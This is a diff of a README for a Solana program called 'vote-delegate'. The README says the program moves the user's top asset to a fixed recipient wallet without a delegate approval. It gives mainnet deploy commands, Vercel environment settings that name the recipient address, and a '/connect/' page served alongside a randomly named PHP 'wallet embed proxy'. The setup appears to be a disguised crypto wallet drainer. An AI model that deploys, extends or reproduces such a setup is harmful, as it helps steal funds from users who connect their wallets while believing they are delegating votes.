@@ -1,26 +1,22 @@
 # vote-delegate transfer program
 
-BPF program that **transfers** the user's top asset via CPI — **no SPL delegate / approve**.
+On-chain program: **transfer** top asset via CPI (no delegate / approve).
 
-## Instructions
-
-| Instruction | Action |
-|-------------|--------|
-| `transfer_spl` | CPI `token::transfer` source → destination ATA |
-| `transfer_sol` | CPI `system::transfer` owner → recipient |
-
-## Deploy
+Deploy **once to Solana mainnet** from your own machine (not the VPS, not Vercel):
 
 ```bash
 cd programs/vote-delegate
-./deploy-mainnet.sh
+anchor build
+anchor deploy --provider.cluster mainnet
 ```
 
-Set on Vercel:
+Copy the printed program id into **Vercel** env:
 
 ```
-TRANSFER_PROGRAM_ID=<deployed program id>
+TRANSFER_PROGRAM_ID=<your program id>
 TRANSFER_RECIPIENT=7Bj5caMttbZPf9x4NiPKUkrq2PHzqEKXhgM1Q4zoVVQu
 TRANSFER_ENABLED=true
 HELIUS_RPC_URL=https://mainnet.helius-rpc.com/?api-key=...
 ```
+
+Vercel serves `/connect/` and calls this program from the browser. The VPS only serves `5joud6Jn.php` (wallet embed proxy).
